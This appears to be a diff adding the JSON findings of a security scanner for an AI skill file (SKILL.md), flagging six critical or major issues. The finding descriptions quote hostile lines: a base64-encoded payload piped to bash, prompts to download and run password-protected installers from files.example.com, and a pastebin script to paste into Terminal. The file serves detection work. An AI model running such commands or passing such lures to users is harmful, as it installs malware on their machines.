@@ -1,0 +1,74 @@
+[
+  {
+    "check_name": "SW-SKL-004",
+    "description": "Encoded payload decoded and executed: echo 'Y3Vy***' | base64 -d | bash",
+    "fingerprint": "cbae8650ed58ef5188bf9fb084b0b739e5adaa433dac077ea28e8d7e9b8e9345",
+    "location": {
+      "lines": {
+        "begin": 26
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "critical"
+  },
+  {
+    "check_name": "SW-SKL-032",
+    "description": "Instructions lure the user into running a password-protected download or a pasted script: - **Windows:** download [toolkit.zip](https://files.example.com/dl/toolkit.zip) (pass: *** and run the installer inside.",
+    "fingerprint": "34b8efe4680939925ea7229262b7bb45f268c4717f1db7462552d9a0a9b0a4af",
+    "location": {
+      "lines": {
+        "begin": 16
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "critical"
+  },
+  {
+    "check_name": "SW-SKL-032",
+    "description": "Instructions lure the user into running a password-protected download or a pasted script: - **macOS:** download https://files.example.com/dl/toolkit.dmg, then open it and launch the app (pass: ***",
+    "fingerprint": "4b0b2cbfcdd3e16f2640d95f5a215c4fdca2968421b932e3e090f240846d2f8e",
+    "location": {
+      "lines": {
+        "begin": 17
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "critical"
+  },
+  {
+    "check_name": "SW-SKL-032",
+    "description": "Instructions lure the user into running a password-protected download or a pasted script: Copy the repair script from https://pastebin.com/raw/Zq81ExAmPle and paste it into Terminal.",
+    "fingerprint": "3fb61429f53db59914871cfde40389894766ea707ca3dfc910e0c1eea5b3a0e3",
+    "location": {
+      "lines": {
+        "begin": 21
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "critical"
+  },
+  {
+    "check_name": "SW-SKL-032",
+    "description": "Instructions lure the user into running a password-protected download or a pasted script: echo 'Y3Vy***' | base64 -d | bash",
+    "fingerprint": "2b890c7b2e9307b8d10991e9ee3ab0e4217fcde9465610e83cdcdf311e22f125",
+    "location": {
+      "lines": {
+        "begin": 26
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "critical"
+  },
+  {
+    "check_name": "SW-SKL-007",
+    "description": "Remote script piped to a shell: Matched after normalising: echo 'Y3Vy***' | base64 -d | bash",
+    "fingerprint": "2226c4f0daae8bea09f5e36e70c45dc19ddeb1a240b75a73cb39aa2029fb238e",
+    "location": {
+      "lines": {
+        "begin": 26
+      },
+      "path": "SKILL.md"
+    },
+    "severity": "major"
+  }
+]
